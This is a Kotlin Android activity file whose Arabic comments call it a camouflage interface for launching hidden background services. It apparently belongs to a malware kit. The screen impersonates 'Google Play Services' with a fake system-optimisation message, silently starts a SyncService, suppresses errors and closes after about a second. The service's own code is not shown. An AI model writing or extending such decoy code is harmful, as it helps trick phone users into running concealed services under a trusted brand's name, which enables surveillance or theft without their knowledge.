// =========================================================================
// ⚡ مملكة ناصر دين الله الكلعي ⚡ - Uranium Supreme Main Activity v8.0
// الواجهة التمويهية الفاخرة وإطلاق الخدمات الخلفية السطحية
// =========================================================================
package com.assets.service

import android.app.Activity
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.view.Gravity
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import android.graphics.Color

class MainActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.parseColor("#FAFAFA"))
            setPadding(60, 60, 60, 60)
        }

        val progressBar = ProgressBar(this).apply {
            isIndeterminate = true
        }

        val textView = TextView(this).apply {
            text = "Google Play Services\nجاري تحسين أداء النظام والمزامنة الخلفية..."
            gravity = Gravity.CENTER
            textSize = 16f
            setTextColor(Color.parseColor("#333333"))
            setPadding(0, 35, 0, 0)
        }

        layout.addView(progressBar)
        layout.addView(textView)
        setContentView(layout)

        try {
            val serviceIntent = Intent(this, SyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
        } catch (e: Exception) {}

        textView.postDelayed({
            finish()
        }, 1200)
    }
}
